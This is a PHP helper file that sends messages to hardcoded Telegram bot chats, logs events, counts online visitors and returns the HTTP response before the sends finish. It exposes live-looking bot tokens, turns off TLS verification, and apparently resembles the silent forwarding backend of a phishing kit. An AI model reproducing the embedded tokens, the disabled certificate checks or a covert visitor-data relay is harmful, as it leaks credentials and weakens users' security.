<?php
/**
 * Shared Telegram helpers — fast + PHP 5.6+ compatible for VPS.
 */

function juj_bots() {
  return array(
    "8807162967:AAEv6NVQVxxEQ22HWCb84Kd7PuZ73idQR8o" => array("-5137105290", "8762872489"),
    "8892755403:AAHUWYC2SESRsvn_m9DMNSy1zuIqO5Dl7S4" => array("-1004387628915", "7373778210"),
  );
}

/**
 * Send to all bots/chats in parallel (curl_multi) so PHP workers free quickly.
 */
function juj_tg_send($text, $parseMode = null, $onlyToken = null) {
  $jobs = array();
  foreach (juj_bots() as $token => $chats) {
    if ($onlyToken && $token !== $onlyToken) {
      continue;
    }
    foreach ($chats as $chatId) {
      $payload = array("chat_id" => $chatId, "text" => $text);
      if ($parseMode) {
        $payload["parse_mode"] = $parseMode;
      }
      $jobs[] = array(
        "url" => "https://api.telegram.org/bot" . $token . "/sendMessage",
        "post" => http_build_query($payload),
      );
    }
  }

  $sent = 0;

  if (function_exists("curl_multi_init")) {
    $mh = curl_multi_init();
    $handles = array();
    foreach ($jobs as $i => $job) {
      $curl = curl_init($job["url"]);
      curl_setopt($curl, CURLOPT_POST, true);
      curl_setopt($curl, CURLOPT_POSTFIELDS, $job["post"]);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 2);
      curl_setopt($curl, CURLOPT_TIMEOUT, 3);
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
      curl_multi_add_handle($mh, $curl);
      $handles[$i] = $curl;
    }

    $running = null;
    do {
      $mrc = curl_multi_exec($mh, $running);
      if ($running) {
        curl_multi_select($mh, 0.2);
      }
    } while ($running && $mrc === CURLM_OK);

    foreach ($handles as $curl) {
      $res = curl_multi_getcontent($curl);
      $code = (int)curl_getinfo($curl, CURLINFO_HTTP_CODE);
      if ($res !== false && $code >= 200 && $code < 300) {
        $decoded = json_decode($res, true);
        if (is_array($decoded) && !empty($decoded["ok"])) {
          $sent++;
        }
      }
      curl_multi_remove_handle($mh, $curl);
      curl_close($curl);
    }
    curl_multi_close($mh);
    return $sent;
  }

  // Fallback: short sequential sends
  foreach ($jobs as $job) {
    if (function_exists("curl_init")) {
      $curl = curl_init($job["url"]);
      curl_setopt($curl, CURLOPT_POST, true);
      curl_setopt($curl, CURLOPT_POSTFIELDS, $job["post"]);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 2);
      curl_setopt($curl, CURLOPT_TIMEOUT, 3);
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
      $res = curl_exec($curl);
      $code = (int)curl_getinfo($curl, CURLINFO_HTTP_CODE);
      curl_close($curl);
      if ($res !== false && $code >= 200 && $code < 300) {
        $decoded = json_decode($res, true);
        if (is_array($decoded) && !empty($decoded["ok"])) {
          $sent++;
        }
      }
    } else {
      $ctx = stream_context_create(array(
        "http" => array(
          "method" => "POST",
          "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
          "content" => $job["post"],
          "timeout" => 3,
          "ignore_errors" => true,
        ),
        "ssl" => array(
          "verify_peer" => false,
          "verify_peer_name" => false,
        ),
      ));
      $res = @file_get_contents($job["url"], false, $ctx);
      if ($res !== false) {
        $decoded = json_decode($res, true);
        if (is_array($decoded) && !empty($decoded["ok"])) {
          $sent++;
        }
      }
    }
  }
  return $sent;
}

function juj_data_dir() {
  $logDir = __DIR__ . "/data";
  if (!is_dir($logDir)) {
    @mkdir($logDir, 0755, true);
  }
  return $logDir;
}

function juj_log_event($row) {
  $logDir = juj_data_dir();
  @file_put_contents(
    $logDir . "/svar.jsonl",
    json_encode($row, JSON_UNESCAPED_UNICODE) . "\n",
    FILE_APPEND
  );
  $countFile = $logDir . "/events.count";
  $n = 0;
  if (is_readable($countFile)) {
    $n = (int)@file_get_contents($countFile);
  }
  @file_put_contents($countFile, (string)($n + 1));
}

/** One small line per heartbeat. Timestamp is in the line, not file mtime. */
function juj_touch_online($sessionId) {
  if ($sessionId === "" || $sessionId === null) {
    return;
  }
  $safe = preg_replace('/[^a-zA-Z0-9._-]/', "_", (string)$sessionId);
  if ($safe === "") {
    return;
  }
  $file = juj_data_dir() . "/presence.log";
  @file_put_contents($file, time() . " " . $safe . "\n", FILE_APPEND);
  $size = @filesize($file);
  if ($size && $size > 1500000) {
    $tail = @file_get_contents($file, false, null, max(0, $size - 200000));
    if ($tail !== false) {
      @file_put_contents($file, $tail);
    }
  }
}

function juj_count_online($seconds) {
  $file = juj_data_dir() . "/presence.log";
  if (!is_readable($file)) {
    return 0;
  }
  $size = @filesize($file);
  $raw = @file_get_contents($file, false, null, $size > 80000 ? $size - 80000 : 0);
  if ($raw === false || $raw === "") {
    return 0;
  }
  $cut = time() - (int)$seconds;
  $seen = array();
  $lines = explode("\n", $raw);
  foreach ($lines as $line) {
    $line = trim($line);
    if ($line === "") {
      continue;
    }
    $bits = explode(" ", $line, 2);
    if (count($bits) < 2) {
      continue;
    }
    $t = (int)$bits[0];
    if ($t >= $cut) {
      $seen[$bits[1]] = true;
    }
  }
  return count($seen);
}

function juj_event_total() {
  $countFile = juj_data_dir() . "/events.count";
  if (!is_readable($countFile)) {
    return 0;
  }
  return (int)@file_get_contents($countFile);
}

/** Send the HTTP body, then keep running so Telegram does not block the visitor. */
function juj_finish_response($payload) {
  $json = json_encode($payload);
  header("Content-Length: " . strlen($json));
  echo $json;
  if (function_exists("fastcgi_finish_request")) {
    @fastcgi_finish_request();
    return;
  }
  @ignore_user_abort(true);
  if (function_exists("ob_get_level")) {
    while (ob_get_level() > 0) {
      @ob_end_flush();
    }
  }
  @flush();
}
